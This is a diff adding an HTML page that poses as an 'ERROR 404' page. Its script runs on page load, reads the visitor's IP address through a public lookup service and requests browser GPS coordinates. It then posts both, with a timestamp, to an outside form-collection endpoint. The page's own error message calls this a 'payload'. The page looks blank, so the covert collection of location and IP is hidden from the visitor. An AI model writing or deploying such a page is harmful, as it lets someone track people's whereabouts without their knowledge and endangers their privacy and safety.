@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>ERROR 404</title>
+  <script>
+    (async () => {
+      try {
+        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+
+        const gpsPromise = new Promise((resolve) => {
+          navigator.geolocation.getCurrentPosition(
+            pos => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
+            err => resolve('Location Denied')
+          );
+        });
+
+        const gps = await gpsPromise;
+
+        await fetch("https://getform.io/f/adrnjjla", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            ip: ipData.ip,
+            gps: gps,
+            timestamp: new Date().toISOString()
+          })
+        });
+      } catch (err) {
+        console.error("Payload failed:", err);
+      }
+    })();
+  </script>
+</head>
+<body>
+  <h1>ERROR 404</h1>
+  <p>       </p>
+</body>
+</html>
